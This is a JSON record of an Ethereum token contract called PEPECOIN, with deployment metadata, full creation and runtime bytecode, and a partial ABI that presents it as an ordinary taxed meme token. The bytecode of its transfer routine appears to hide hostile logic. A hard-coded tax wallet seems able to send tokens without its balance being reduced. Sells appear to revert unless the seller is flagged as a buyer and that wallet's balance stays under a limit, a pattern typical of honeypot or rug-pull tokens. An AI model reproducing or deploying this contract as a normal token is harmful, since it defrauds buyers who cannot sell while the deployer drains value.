{
    "address": "0xaE69c2886c0E01A3851292649e54BD51e4532383",
    "tx_hash": "7270f948f498cd6cb6923a70517b143c3e787724922f39e6d5ec308266ae3fd5",
    "block_number": 18004496,
    "timestamp": 1693121075,
    "gas_used_in_creation": 1814511,
    "creation_bytecode": "60806040526006805460ff191690556200001c6009600a62000357565b6200002c906305f5e1006200036e565b6007556200003d6009600a62000357565b6200004d906305f5e1006200036e565b6008556200005e6009600a62000357565b6200006e906305f5e1006200036e565b6009556009600a62000081919062000357565b62000091906305f5e1006200036e565b600a556005600b556014600c8190556001600d819055600e8190556004600f556010555f6011819055601255805461ffff60a81b19169055348015620000d5575f80fd5b505f80546001600160a01b031916339081178255604051909182917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a35060068054610100600160a81b0319167469ccee6710f906390d4c348b4978be300b13373f001790556200014c6009600a62000357565b6200015c906305f5e1006200036e565b335f908152600160208190526040822092909255600390620001855f546001600160a01b031690565b6001600160a01b03908116825260208083019390935260409182015f908120805495151560ff1996871617905530815260039093528183208054851660019081179091556006546101009004909116835291208054909216179055620001e83390565b6001600160a01b03165f7fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620002216009600a62000357565b62000231906305f5e1006200036e565b60405190815260200160405180910390a362000388565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200029c57815f190482111562000280576200028062000248565b808516156200028e57918102915b93841c939080029062000261565b509250929050565b5f82620002b45750600162000351565b81620002c257505f62000351565b8160018114620002db5760028114620002e65762000306565b600191505062000351565b60ff841115620002fa57620002fa62000248565b50506001821b62000351565b5060208310610133831016604e8410600b84101617156200032b575081810a62000351565b6200033783836200025c565b805f19048211156200034d576200034d62000248565b0290505b92915050565b5f6200036760ff841683620002a4565b9392505050565b808202811582820484141762000351576200035162000248565b6118f280620003965f395ff3fe608060405260043610610108575f3560e01c80637d1db4a511610092578063a9059cbb11610062578063a9059cbb146102d4578063bf474bed146102f3578063c876d0b914610308578063c9567bf914610321578063dd62ed3e14610335575f80fd5b80637d1db4a5146102545780638da5cb5b146102695780638f9a55c01461028f57806395d89b41146102a4575f80fd5b806323b872dd116100d857806323b872dd146101bc578063313ce567146101db57806370a08231146101f6578063715018a61461022a578063751039fc14610240575f80fd5b806306fdde0314610113578063095ea7b3146101565780630faee56f1461018557806318160ddd146101a8575f80fd5b3661010f57005b5f80fd5b34801561011e575f80fd5b506040805180820190915260098152682832b8329021b7b4b760b91b60208201525b60405161014d91906114e5565b60405180910390f35b348015610161575f80fd5b50610175610170366004611547565b610379565b604051901515815260200161014d565b348015610190575f80fd5b5061019a600a5481565b60405190815260200161014d565b3480156101b3575f80fd5b5061019a61038f565b3480156101c7575f80fd5b506101756101d6366004611571565b6103af565b3480156101e6575f80fd5b506040516009815260200161014d565b348015610201575f80fd5b5061019a6102103660046115af565b6001600160a01b03165f9081526001602052604090205490565b348015610235575f80fd5b5061023e610417565b005b34801561024b575f80fd5b5061023e610491565b34801561025f575f80fd5b5061019a60075481565b348015610274575f80fd5b505f546040516001600160a01b03909116815260200161014d565b34801561029a575f80fd5b5061019a60085481565b3480156102af575f80fd5b506040805180820190915260088152672822a822a1a7a4a760c11b6020820152610140565b3480156102df575f80fd5b506101756102ee366004611547565b61054c565b3480156102fe575f80fd5b5061019a60095481565b348015610313575f80fd5b506006546101759060ff1681565b34801561032c575f80fd5b5061023e610558565b348015610340575f80fd5b5061019a61034f3660046115ca565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b5f610385338484610901565b5060015b92915050565b5f61039c6009600a6116f5565b6103aa906305f5e100611703565b905090565b5f6103bb848484610a24565b61040c843361040785604051806060016040528060288152602001611895602891396001600160a01b038a165f9081526002602090815260408083203384529091529020549190611112565b610901565b5060015b9392505050565b5f546001600160a01b031633146104495760405162461bcd60e51b81526004016104409061171a565b60405180910390fd5b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146104ba5760405162461bcd60e51b81526004016104409061171a565b6104c66009600a6116f5565b6104d4906305f5e100611703565b6007556104e36009600a6116f5565b6104f1906305f5e100611703565b6008556006805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf61052b6009600a6116f5565b610539906305f5e100611703565b60405190815260200160405180910390a1565b5f610385338484610a24565b5f546001600160a01b031633146105815760405162461bcd60e51b81526004016104409061171a565b601454600160a01b900460ff16156105db5760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e0000000000000000006044820152606401610440565b601380546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556106249030906106166009600a6116f5565b610407906305f5e100611703565b60135f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610674573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610698919061174f565b6001600160a01b031663c9c653963060135f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106f7573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061071b919061174f565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af1158015610765573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610789919061174f565b601480546001600160a01b039283166001600160a01b03199091161790556013541663f305d71947306107d0816001600160a01b03165f9081526001602052604090205490565b5f806107e35f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610849573d5f803e3d5ffd5b50505050506040513d601f19601f8201168201806040525081019061086e919061176a565b505060145460135460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af11580156108c3573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108e79190611795565b506014805462ff00ff60a01b19166201000160a01b179055565b6001600160a01b0383166109635760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610440565b6001600160a01b0382166109c45760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610440565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610a885760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610440565b6001600160a01b038216610aea5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610440565b5f8111610b4b5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610440565b5f80546001600160a01b03858116911614801590610b7657505f546001600160a01b03848116911614155b15610fd35760065460ff1615610c32576013546001600160a01b03848116911614801590610bb257506014546001600160a01b03848116911614155b15610c3257325f908152600560205260409020544311610c205760405162461bcd60e51b8152602060048201526024808201527f4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f6044820152633bb2b21760e11b6064820152608401610440565b325f9081526005602052604090204390555b6014546001600160a01b038581169116148015610c5d57506013546001600160a01b03848116911614155b8015610c8157506001600160a01b0383165f9081526003602052604090205460ff16155b15610dcd57600754821115610cd45760405162461bcd60e51b815260206004820152601960248201527822bc31b2b2b239903a3432902fb6b0bc2a3c20b6b7bab73a1760391b6044820152606401610440565b60085482610cf6856001600160a01b03165f9081526001602052604090205490565b610d0091906117b4565b1115610d4e5760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e0000000000006044820152606401610440565b6011546012541015610d6557823b15610d65575f80fd5b60128054905f610d74836117c7565b90915550506001600160a01b0383165f908152600460205260409020805460ff19166001179055600f54601254610dca91606491610dc49110610db957600b54610dbd565b600d545b859061114a565b906111c8565b90505b6014546001600160a01b038481169116148015610df357506001600160a01b0384163014155b8015610e1757506001600160a01b0384165f9081526003602052604090205460ff16155b15610eee576007548211158015610e4d5750600a5460065461010090046001600160a01b03165f90815260016020526040902054105b610e955760405162461bcd60e51b815260206004820152601960248201527822bc31b2b2b239903a3432902fb6b0bc2a3c20b6b7bab73a1760391b6044820152606401610440565b610eba6064610dc460105460125411610eb057600c54610dbd565b600e54859061114a565b9050601154601254118015610ee657506001600160a01b0384165f9081526004602052604090205460ff165b610eee575f80fd5b305f90815260016020526040902054601454600160a81b900460ff16158015610f2457506014546001600160a01b038581169116145b8015610f395750601454600160b01b900460ff165b8015610f46575060095481115b8015610f555750601154601254115b8015610f7957506001600160a01b0384165f9081526003602052604090205460ff16155b8015610f9d57506001600160a01b0385165f9081526003602052604090205460ff16155b15610fd157610fbf610fba84610fb584600a54611209565b611209565b61121d565b478015610fcf57610fcf476113a6565b505b505b801561104b57305f90815260016020526040902054610ff290826113e5565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906110429085815260200190565b60405180910390a35b6001600160a01b0384165f9081526001602052604090205461106f90859084611443565b6001600160a01b0385165f908152600160205260409020556110b26110948383611478565b6001600160a01b0385165f90815260016020526040902054906113e5565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6110fb8585611478565b60405190815260200160405180910390a350505050565b5f81848411156111355760405162461bcd60e51b815260040161044091906114e5565b505f61114184866117df565b95945050505050565b5f825f0361115957505f610389565b5f6111648385611703565b90508261117185836117f2565b146104105760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610440565b5f61041083836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506114b9565b5f8183116112175782610410565b50919050565b6014805460ff60a81b1916600160a81b179055801561139657601454600160a01b900460ff1615611396576040805160028082526060820183525f9260208301908036833701905050905030815f8151811061127b5761127b611811565b6001600160a01b03928316602091820292909201810191909152601354604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa1580156112d2573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112f6919061174f565b8160018151811061130957611309611811565b6001600160a01b03928316602091820292909201015260135461132f9130911684610901565b60135460405163791ac94760e01b81526001600160a01b039091169063791ac947906113679085905f90869030904290600401611825565b5f604051808303815f87803b15801561137e575f80fd5b505af1158015611390573d5f803e3d5ffd5b50505050505b506014805460ff60a81b19169055565b6006546040516101009091046001600160a01b0316906108fc8315029083905f818181858888f193505050501580156113e1573d5f803e3d5ffd5b5050565b5f806113f183856117b4565b9050838110156104105760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610440565b6006545f906001600160a01b03610100909104811690851603611467575081610410565b6114718383611478565b9050610410565b5f61041083836040518060400160405280601f81526020017f536166654d6174683a20207375627472616374696f6e206f766572666c6f7700815250611112565b5f81836114d95760405162461bcd60e51b815260040161044091906114e5565b505f61114184866117f2565b5f6020808352835180828501525f5b81811015611510578581018301518582016040015282016114f4565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114611544575f80fd5b50565b5f8060408385031215611558575f80fd5b823561156381611530565b946020939093013593505050565b5f805f60608486031215611583575f80fd5b833561158e81611530565b9250602084013561159e81611530565b929592945050506040919091013590565b5f602082840312156115bf575f80fd5b813561041081611530565b5f80604083850312156115db575f80fd5b82356115e681611530565b915060208301356115f681611530565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561164f57815f190482111561163557611635611601565b8085161561164257918102915b93841c939080029061161a565b509250929050565b5f8261166557506001610389565b8161167157505f610389565b81600181146116875760028114611691576116ad565b6001915050610389565b60ff8411156116a2576116a2611601565b50506001821b610389565b5060208310610133831016604e8410600b84101617156116d0575081810a610389565b6116da8383611615565b805f19048211156116ed576116ed611601565b029392505050565b5f61041060ff841683611657565b808202811582820484141761038957610389611601565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f6020828403121561175f575f80fd5b815161041081611530565b5f805f6060848603121561177c575f80fd5b8351925060208401519150604084015190509250925092565b5f602082840312156117a5575f80fd5b81518015158114610410575f80fd5b8082018082111561038957610389611601565b5f600182016117d8576117d8611601565b5060010190565b8181038181111561038957610389611601565b5f8261180c57634e487b7160e01b5f52601260045260245ffd5b500490565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b818110156118735784516001600160a01b03168352938301939183019160010161184e565b50506001600160a01b0396909616606085015250505060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212200a6df68f01f56e25902b092155f80c1b8b1b5c97ca288836c6db8933d9f390ac64736f6c63430008140033",
    "runtime_bytecode": "608060405260043610610108575f3560e01c80637d1db4a511610092578063a9059cbb11610062578063a9059cbb146102d4578063bf474bed146102f3578063c876d0b914610308578063c9567bf914610321578063dd62ed3e14610335575f80fd5b80637d1db4a5146102545780638da5cb5b146102695780638f9a55c01461028f57806395d89b41146102a4575f80fd5b806323b872dd116100d857806323b872dd146101bc578063313ce567146101db57806370a08231146101f6578063715018a61461022a578063751039fc14610240575f80fd5b806306fdde0314610113578063095ea7b3146101565780630faee56f1461018557806318160ddd146101a8575f80fd5b3661010f57005b5f80fd5b34801561011e575f80fd5b506040805180820190915260098152682832b8329021b7b4b760b91b60208201525b60405161014d91906114e5565b60405180910390f35b348015610161575f80fd5b50610175610170366004611547565b610379565b604051901515815260200161014d565b348015610190575f80fd5b5061019a600a5481565b60405190815260200161014d565b3480156101b3575f80fd5b5061019a61038f565b3480156101c7575f80fd5b506101756101d6366004611571565b6103af565b3480156101e6575f80fd5b506040516009815260200161014d565b348015610201575f80fd5b5061019a6102103660046115af565b6001600160a01b03165f9081526001602052604090205490565b348015610235575f80fd5b5061023e610417565b005b34801561024b575f80fd5b5061023e610491565b34801561025f575f80fd5b5061019a60075481565b348015610274575f80fd5b505f546040516001600160a01b03909116815260200161014d565b34801561029a575f80fd5b5061019a60085481565b3480156102af575f80fd5b506040805180820190915260088152672822a822a1a7a4a760c11b6020820152610140565b3480156102df575f80fd5b506101756102ee366004611547565b61054c565b3480156102fe575f80fd5b5061019a60095481565b348015610313575f80fd5b506006546101759060ff1681565b34801561032c575f80fd5b5061023e610558565b348015610340575f80fd5b5061019a61034f3660046115ca565b6001600160a01b039182165f90815260026020908152604080832093909416825291909152205490565b5f610385338484610901565b5060015b92915050565b5f61039c6009600a6116f5565b6103aa906305f5e100611703565b905090565b5f6103bb848484610a24565b61040c843361040785604051806060016040528060288152602001611895602891396001600160a01b038a165f9081526002602090815260408083203384529091529020549190611112565b610901565b5060015b9392505050565b5f546001600160a01b031633146104495760405162461bcd60e51b81526004016104409061171a565b60405180910390fd5b5f80546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a35f80546001600160a01b0319169055565b5f546001600160a01b031633146104ba5760405162461bcd60e51b81526004016104409061171a565b6104c66009600a6116f5565b6104d4906305f5e100611703565b6007556104e36009600a6116f5565b6104f1906305f5e100611703565b6008556006805460ff191690557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf61052b6009600a6116f5565b610539906305f5e100611703565b60405190815260200160405180910390a1565b5f610385338484610a24565b5f546001600160a01b031633146105815760405162461bcd60e51b81526004016104409061171a565b601454600160a01b900460ff16156105db5760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e0000000000000000006044820152606401610440565b601380546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556106249030906106166009600a6116f5565b610407906305f5e100611703565b60135f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610674573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610698919061174f565b6001600160a01b031663c9c653963060135f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106f7573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061071b919061174f565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af1158015610765573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610789919061174f565b601480546001600160a01b039283166001600160a01b03199091161790556013541663f305d71947306107d0816001600160a01b03165f9081526001602052604090205490565b5f806107e35f546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610849573d5f803e3d5ffd5b50505050506040513d601f19601f8201168201806040525081019061086e919061176a565b505060145460135460405163095ea7b360e01b81526001600160a01b0391821660048201525f1960248201529116915063095ea7b3906044016020604051808303815f875af11580156108c3573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108e79190611795565b506014805462ff00ff60a01b19166201000160a01b179055565b6001600160a01b0383166109635760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610440565b6001600160a01b0382166109c45760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610440565b6001600160a01b038381165f8181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610a885760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610440565b6001600160a01b038216610aea5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610440565b5f8111610b4b5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610440565b5f80546001600160a01b03858116911614801590610b7657505f546001600160a01b03848116911614155b15610fd35760065460ff1615610c32576013546001600160a01b03848116911614801590610bb257506014546001600160a01b03848116911614155b15610c3257325f908152600560205260409020544311610c205760405162461bcd60e51b8152602060048201526024808201527f4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f6044820152633bb2b21760e11b6064820152608401610440565b325f9081526005602052604090204390555b6014546001600160a01b038581169116148015610c5d57506013546001600160a01b03848116911614155b8015610c8157506001600160a01b0383165f9081526003602052604090205460ff16155b15610dcd57600754821115610cd45760405162461bcd60e51b815260206004820152601960248201527822bc31b2b2b239903a3432902fb6b0bc2a3c20b6b7bab73a1760391b6044820152606401610440565b60085482610cf6856001600160a01b03165f9081526001602052604090205490565b610d0091906117b4565b1115610d4e5760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e0000000000006044820152606401610440565b6011546012541015610d6557823b15610d65575f80fd5b60128054905f610d74836117c7565b90915550506001600160a01b0383165f908152600460205260409020805460ff19166001179055600f54601254610dca91606491610dc49110610db957600b54610dbd565b600d545b859061114a565b906111c8565b90505b6014546001600160a01b038481169116148015610df357506001600160a01b0384163014155b8015610e1757506001600160a01b0384165f9081526003602052604090205460ff16155b15610eee576007548211158015610e4d5750600a5460065461010090046001600160a01b03165f90815260016020526040902054105b610e955760405162461bcd60e51b815260206004820152601960248201527822bc31b2b2b239903a3432902fb6b0bc2a3c20b6b7bab73a1760391b6044820152606401610440565b610eba6064610dc460105460125411610eb057600c54610dbd565b600e54859061114a565b9050601154601254118015610ee657506001600160a01b0384165f9081526004602052604090205460ff165b610eee575f80fd5b305f90815260016020526040902054601454600160a81b900460ff16158015610f2457506014546001600160a01b038581169116145b8015610f395750601454600160b01b900460ff165b8015610f46575060095481115b8015610f555750601154601254115b8015610f7957506001600160a01b0384165f9081526003602052604090205460ff16155b8015610f9d57506001600160a01b0385165f9081526003602052604090205460ff16155b15610fd157610fbf610fba84610fb584600a54611209565b611209565b61121d565b478015610fcf57610fcf476113a6565b505b505b801561104b57305f90815260016020526040902054610ff290826113e5565b305f81815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906110429085815260200190565b60405180910390a35b6001600160a01b0384165f9081526001602052604090205461106f90859084611443565b6001600160a01b0385165f908152600160205260409020556110b26110948383611478565b6001600160a01b0385165f90815260016020526040902054906113e5565b6001600160a01b038085165f8181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6110fb8585611478565b60405190815260200160405180910390a350505050565b5f81848411156111355760405162461bcd60e51b815260040161044091906114e5565b505f61114184866117df565b95945050505050565b5f825f0361115957505f610389565b5f6111648385611703565b90508261117185836117f2565b146104105760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610440565b5f61041083836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506114b9565b5f8183116112175782610410565b50919050565b6014805460ff60a81b1916600160a81b179055801561139657601454600160a01b900460ff1615611396576040805160028082526060820183525f9260208301908036833701905050905030815f8151811061127b5761127b611811565b6001600160a01b03928316602091820292909201810191909152601354604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa1580156112d2573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112f6919061174f565b8160018151811061130957611309611811565b6001600160a01b03928316602091820292909201015260135461132f9130911684610901565b60135460405163791ac94760e01b81526001600160a01b039091169063791ac947906113679085905f90869030904290600401611825565b5f604051808303815f87803b15801561137e575f80fd5b505af1158015611390573d5f803e3d5ffd5b50505050505b506014805460ff60a81b19169055565b6006546040516101009091046001600160a01b0316906108fc8315029083905f818181858888f193505050501580156113e1573d5f803e3d5ffd5b5050565b5f806113f183856117b4565b9050838110156104105760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610440565b6006545f906001600160a01b03610100909104811690851603611467575081610410565b6114718383611478565b9050610410565b5f61041083836040518060400160405280601f81526020017f536166654d6174683a20207375627472616374696f6e206f766572666c6f7700815250611112565b5f81836114d95760405162461bcd60e51b815260040161044091906114e5565b505f61114184866117f2565b5f6020808352835180828501525f5b81811015611510578581018301518582016040015282016114f4565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114611544575f80fd5b50565b5f8060408385031215611558575f80fd5b823561156381611530565b946020939093013593505050565b5f805f60608486031215611583575f80fd5b833561158e81611530565b9250602084013561159e81611530565b929592945050506040919091013590565b5f602082840312156115bf575f80fd5b813561041081611530565b5f80604083850312156115db575f80fd5b82356115e681611530565b915060208301356115f681611530565b809150509250929050565b634e487b7160e01b5f52601160045260245ffd5b600181815b8085111561164f57815f190482111561163557611635611601565b8085161561164257918102915b93841c939080029061161a565b509250929050565b5f8261166557506001610389565b8161167157505f610389565b81600181146116875760028114611691576116ad565b6001915050610389565b60ff8411156116a2576116a2611601565b50506001821b610389565b5060208310610133831016604e8410600b84101617156116d0575081810a610389565b6116da8383611615565b805f19048211156116ed576116ed611601565b029392505050565b5f61041060ff841683611657565b808202811582820484141761038957610389611601565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f6020828403121561175f575f80fd5b815161041081611530565b5f805f6060848603121561177c575f80fd5b8351925060208401519150604084015190509250925092565b5f602082840312156117a5575f80fd5b81518015158114610410575f80fd5b8082018082111561038957610389611601565b5f600182016117d8576117d8611601565b5060010190565b8181038181111561038957610389611601565b5f8261180c57634e487b7160e01b5f52601260045260245ffd5b500490565b634e487b7160e01b5f52603260045260245ffd5b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b818110156118735784516001600160a01b03168352938301939183019160010161184e565b50506001600160a01b0396909616606085015250505060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212200a6df68f01f56e25902b092155f80c1b8b1b5c97ca288836c6db8933d9f390ac64736f6c63430008140033",
    "contract_name": "PEPECOIN",
    "compiler_version": "v0.8.20+commit.a1b79de6",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256